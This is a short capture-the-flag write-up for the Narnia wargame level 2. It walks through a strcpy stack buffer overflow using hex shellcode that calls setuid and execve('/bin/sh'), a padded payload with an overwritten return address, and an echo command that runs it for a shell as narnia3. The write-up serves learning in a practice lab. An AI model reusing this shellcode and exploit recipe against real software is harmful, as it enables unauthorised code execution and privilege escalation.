Classic strcpy buffer overflow exercise. Stack is executable.

All we have to do is overwrite the return pointer and point it to our 
shellcode which gives us a shell.

We can use the shellcode used in the previous level here, just modify the
uid and change it to 14003 (narnia3's uid)

	\x31\xc0\x31\xdb\x31\xc9\xb0\x46\x66\xbb\xb3\x36\x66\xb9\xb3\x36\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42

You can check where the return pointer is stored by setting a break point at the
last instruction of main where esp holds the address where the return address
is stored. You can now see where to point your own return pointer.

Constructing a payload with all of this information:

	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x31\xc0\x31\xdb\x31\xc9\xb0\x46\x66\xbb\xb3\x36\x66\xb9\xb3\x36\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42\xdd\xd4\xff\xff\x00\x00\x00\x00

Exploiting:

	echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x31\xc0\x31\xdb\x31\xc9\xb0\x46\x66\xbb\xb3\x36\x66\xb9\xb3\x36\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42\xdd\xd4\xff\xff\x00\x00\x00\x00" > payload

	/narnia/narnia2 $(cat payload)

	-bash: warning: command substitution: ignored null byte in input
	$ whoami
	narnia3
	$ cat /etc/narnia_pass/narnia3
	<password for next level>

